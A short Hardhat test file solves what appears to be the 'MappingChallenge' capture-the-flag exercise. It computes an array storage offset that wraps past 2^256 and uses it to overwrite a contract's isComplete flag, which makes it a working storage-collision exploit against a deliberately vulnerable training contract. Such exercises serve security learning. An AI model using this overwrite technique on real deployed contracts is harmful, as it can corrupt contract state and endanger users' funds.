const { loadFixture } = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { expect } = require("chai");
const { fixtureFactory } = require("../utils");
const assert = require('node:assert').strict;

it("Solves MappingChallenge", async function () {
  const fixture = () => fixtureFactory("MappingChallenge");
  const contract = await loadFixture(fixture);

  // Array data is stored in keccak256(p), keccak256(p)+1, keccak256(p)+2, ... where p is the allocated slot in the order of variable declatarion.
  // https://docs.soliditylang.org/en/v0.8.23/internals/layout_in_storage.html#mappings-and-dynamic-arrays
  const startingPosition = BigInt(ethers.solidityPackedKeccak256(["uint256"], [1]));
  const offset = BigInt(2**256) - startingPosition;

  // Note: This would result in out-of-gas error if using solc version <= 0.4.21. This seems to be an
  //       solc bug that's fixed in 0.4.22.
  await contract.set(offset, 1);

  expect(await contract.isComplete()).to.equal(true);
});
